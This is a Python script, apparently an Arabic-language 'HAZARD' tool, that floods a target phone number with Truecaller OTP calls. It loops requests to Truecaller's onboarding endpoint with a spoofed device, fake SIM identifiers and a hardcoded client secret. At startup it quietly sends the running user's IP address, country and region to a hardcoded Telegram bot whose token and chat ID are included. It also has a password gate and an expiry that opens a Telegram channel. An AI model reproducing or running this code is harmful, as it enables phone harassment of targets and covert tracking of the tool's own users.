import os    
import requests
import requests
ip2 = requests.get("https://api.ipify.org").text
ip = requests.get(f'http://ip-api.com/json/{ip2}').json()
a =  country = ip['country'] 
regionName = ip['regionName']

tlg = (f'''

⋘─────━𓆩𝐇𝐀𝐙𝐀𝐑𝐃𓆪─────━⋙  
ايبي جهاز الصياد : {ip2}
دولة الصياد:- {country} 
مدينة الصياد:- {regionName} 
⋘─────━𓆩𝐇𝐀𝐙𝐀𝐑𝐃𓆪─────━⋙ 

''')

requests.get("https://api.telegram.org/bot6161272190:AAHgSi1-TM12lhG6jIoDxgmD7e6lywL9Uxc/sendMessage?chat_id=1845692361&text="+str(tlg))                     
print('''
\033[1;31m  _    _           ______         _____  _____   
\033[1;32m | |  | |   /\    |___  /   /\   |  __ \|  __ \  
\033[1;33m | |__| |  /  \      / /   /  \  | |__) | |  | | 
\033[1;34m |  __  | / /\ \    / /   / /\ \ |  _  /| |  | | 
\033[1;35m | |  | |/ ____ \  / /__ / ____ \| | \ \| |__| | 
\033[1;36m |_|  |_/_/    \_\/_____/_/    \_\_|  \_\_____/  
                                                 
 '''                                                
)
name = input ('\033[1;32mEntre password \033[1;31m=\033[1;33m=\033[1;34m=\033[1;35m>\033[1;32m')
print('\033[1;32m')
print('\033[132m-----------------------------------------------------------')
if name == 'hazard' : 
	print('\033[1;35m=\033[1;31m=\033[1;34m>\033[1;32m ✅')
	print ('\033[1;34m=\033[1;33m=\033[1;31m>\033[1;32m Password ✅✅✅✅')
else :
   print ('\033[1;31m ❌❌❌❌كلمه السر غلط ')
   exit()
import webbrowser
import requests,time,pyfiglet,datetime
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 7, 29, 23, 00 ,9)


if (x.strftime("%x"))>(g.strftime("%x")):
 print('\033[1;32m تم ايقاف الاداه راسل المطور لتفعيل ')
 time.sleep(1)
 print('\033[1;31m المطور 𝐇𝐀𝐙𝐀𝐑𝐃')
 time.sleep(1)
 print('سيتم نقلك الى قناة المطور خلال 10 ثواني') 
 time.sleep(1)
 print('\033[1;31m 1')
 time.sleep(1)
 print('\033[1;32m 2')
 time.sleep(1)
 print('\033[1;31m 3')
 time.sleep(1)
 print('\033[1;32m 4')
 time.sleep(1)
 print('\033[1;31m 5')
 time.sleep(1)
 print('\033[1;32m 6')
 time.sleep(1)
 print('\033[1;31m 7')
 time.sleep(1)
 print('\033[1;32m 8')
 time.sleep(1)
 print('\033[1;31m 9')
 time.sleep(1)
 print('\033[1;32m10')
 webbrowser.open('https://t.me/H_Z_R7')
 exit()
import webbrowser
webbrowser.open('https://t.me/H_Z_R7')
import requests,hashlib,random,time
target = input('Enter Target ( رقم المستهدف ) :');number = '123456789';id = str(''.join(random.choice(number) for i in range(10)));device_id = hashlib.md5(id.encode()).hexdigest()[:16];headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }
url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp";data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+device_id+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+target+'","region":"region-2","sequenceNo":1}'
call = 0
while True:
	response = requests.post(url, headers=headers, data=data).text
	if '"status":1,"message":"Sent","domain":"noneu","parsedPhoneNumber":' in response:
		call +=1
		print(f"Good Call ( {target} ) | Calls :{call}")
	elif "Invalid phone number" in response:
		exit(f"Invalid phone number ( {target } ) ( الرقم غير صالح )")
	elif "Phone number limit reached" in response:
		exit(f"Number {target} is reached ( لا يمكن الاتصال الان )")
	elif "Secret token pending" in response:
		print("Secret token pending الرقم مشغول حاليا/ Sleep 20 seconds")
		time.sleep(20)
		req = response = requests.post(url, headers=headers, data=data).text
		if "Secret token pending" in req:
			exit("Secret token pending ( الرقم مشغول حاليا يرجى الاتصال بوقت لاحق )")
		else:pass
	elif "Unavailable for legal reasons" in response:
		exit(f"Sorry Number {target} Fake & Unavailable for legal reasons \nعذرًا الرقم {target} وهمي و مخالف للقانون")
	else:
		print(response)
